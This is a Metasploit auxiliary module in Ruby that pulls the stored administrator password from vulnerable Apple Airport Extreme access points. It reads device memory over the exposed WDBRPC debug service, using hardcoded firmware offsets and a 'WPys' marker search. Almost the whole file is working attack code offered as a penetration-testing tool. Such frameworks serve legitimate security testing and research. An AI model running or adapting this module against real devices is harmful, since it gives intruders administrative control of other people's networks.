##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::WDBRPC_Client

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apple Airport Extreme Password Extraction (WDBRPC)',
      'Description'    => %q{
        This module can be used to read the stored password of a vulnerable
      Apple Airport Extreme access point. Only a small number of firmware versions
      have the WDBRPC service running, however the factory configuration was
      vulnerable. It appears that firmware versions 5.0.x as well as 5.1.x are
      susceptible to this issue. Once the password is obtained, the access point
      can be managed using the Apple AirPort utility.
      },
      'Author'         => [ 'hdm'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['OSVDB', '66842'],
          ['URL', 'http://blog.metasploit.com/2010/08/vxworks-vulnerabilities.html'],
          ['US-CERT-VU', '362332']
        ]
      ))
  end

  def run
    target  = nil
    targets = {
      "Apple Base Station V5.0.4" => {
        :version  => 0x0024ee3c,
        :password => 0x00380000,
        :password_search => 32768,
      },
      "Apple Base Station V5.0.3" => {
        :version  => 0x0024e24c,
        :password => 0x00380000,
        :password_search => 32768,
      },
      "Apple Base Station V5.0.1" => {
        :version  => 0x0024b45c,
        :password => 0x00fa7500,
        :password_search => 16384
      }
    }


    wdbrpc_client_connect

    if not @wdbrpc_info[:rt_vers]
      print_error("No response to connection request")
      return
    end

    membase = @wdbrpc_info[:rt_membase]
    found   = false

    targets.each_pair do |tname,target|

      vers = wdbrpc_client_memread(membase + target[:version], 32).unpack("Z*")[0]

      if not (vers and vers.length > 0 and vers == tname)
        next
      end

      found = true

      base = membase + target[:password]
      off  = 0
      mtu  = @wdbrpc_info[:agent_mtu] - 80
      pass = nil

      while off < target[:password_search]
        buff = wdbrpc_client_memread(base + off, mtu)
        pidx = buff.index("WPys")

        if pidx
          plen = buff[pidx + 8, 4].unpack("V")[0]
          pass = buff[pidx + 12, plen].unpack("Z*")[0]
          break
        end

        off += buff.length
      end

      if pass
        print_good("Password for this access point is '#{pass}'")
      else
        print_error("The password could not be located")
      end
      break
    end

    if not found
      print_error("No matching fingerprint for this access point")
    end

    wdbrpc_client_disconnect
  end
end
